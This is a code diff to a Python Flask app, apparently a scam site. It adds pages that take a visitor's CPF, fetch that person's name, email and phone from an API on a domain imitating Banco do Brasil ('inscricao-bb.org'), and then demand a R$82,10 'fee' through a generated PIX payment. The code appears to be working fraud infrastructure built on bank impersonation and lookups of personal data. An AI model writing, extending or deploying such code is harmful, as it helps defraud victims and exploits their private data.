@@ -448,7 +448,7 @@ def pagamento_categoria():
     user_data = session.get('dados_usuario') 
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
-        return redirect(url_for('index'))
+        return redirect(url_for('obrigado'))
 
     categoria = request.form.get('categoria')
     if not categoria:
@@ -506,6 +506,70 @@ def categoria(tipo):
     return render_template(f'categoria_{tipo}.html', 
                          current_year=datetime.now().year,
                          user_data=user_data)
+
+@app.route('/taxa')
+def taxa():
+    return render_template('taxa.html', current_year=datetime.now().year)
+
+@app.route('/verificar_taxa', methods=['POST'])
+def verificar_taxa():
+    cpf = request.form.get('cpf', '').strip()
+    cpf_numerico = ''.join(filter(str.isdigit, cpf))
+
+    if not cpf_numerico or len(cpf_numerico) != 11:
+        flash('CPF inválido. Por favor, digite um CPF válido.')
+        return redirect(url_for('taxa'))
+
+    try:
+        # Consulta à API
+        response = requests.get(
+            f"https://inscricao-bb.org/api_clientes.php?cpf={cpf_numerico}",
+            timeout=30
+        )
+        response.raise_for_status()
+        dados = response.json()
+
+        if dados and 'name' in dados:
+            session['dados_taxa'] = dados
+            return render_template('taxa_pendente.html',
+                                dados=dados,
+                                current_year=datetime.now().year)
+        else:
+            flash('CPF não encontrado ou dados incompletos.')
+            return redirect(url_for('taxa'))
+
+    except Exception as e:
+        logger.error(f"Erro na consulta: {str(e)}")
+        flash('Erro ao consultar CPF. Por favor, tente novamente.')
+        return redirect(url_for('taxa'))
+
+@app.route('/pagamento_taxa', methods=['POST'])
+def pagamento_taxa():
+    dados = session.get('dados_taxa')
+    if not dados:
+        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        return redirect(url_for('taxa'))
+
+    try:
+        payment_api = create_payment_api()
+        payment_data = {
+            'name': dados['name'],
+            'email': dados['email'],
+            'cpf': dados['cpf'],
+            'phone': dados['phone'],
+            'amount': 82.10
+        }
+
+        pix_data = payment_api.create_pix_payment(payment_data)
+        return render_template('pagamento.html',
+                           pix_data=pix_data,
+                           valor_total="82,10",
+                           current_year=datetime.now().year)
+
+    except Exception as e:
+        logger.error(f"Erro ao gerar pagamento: {e}")
+        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
+        return redirect(url_for('taxa'))
 
 def generate_random_email():
     return f"user_{random.randint(1,1000)}@example.com"
